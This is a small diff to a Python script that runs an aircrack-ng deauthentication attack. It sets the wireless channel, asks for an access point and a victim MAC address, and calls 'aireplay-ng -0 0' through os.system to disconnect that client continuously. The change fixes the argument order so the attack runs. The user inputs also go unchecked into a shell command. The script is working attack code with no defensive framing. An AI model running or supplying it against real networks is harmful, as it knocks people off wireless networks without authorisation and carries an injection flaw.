@@ -5,7 +5,7 @@ os.system(f"sudo iwconfig {interface} channel {ent_ch}")
 try: 
   ap = input("ap: ")
   target_mac = input("mac: ")
-  os.system(f"sudo aireplay-ng -0 0 -a {ap} {interface} -c {target_mac}")
+  os.system(f"sudo aireplay-ng -0 0 -a {ap} -c {target_mac} {interface}")
 except KeyboardInterrupt:
   print("exited")
 
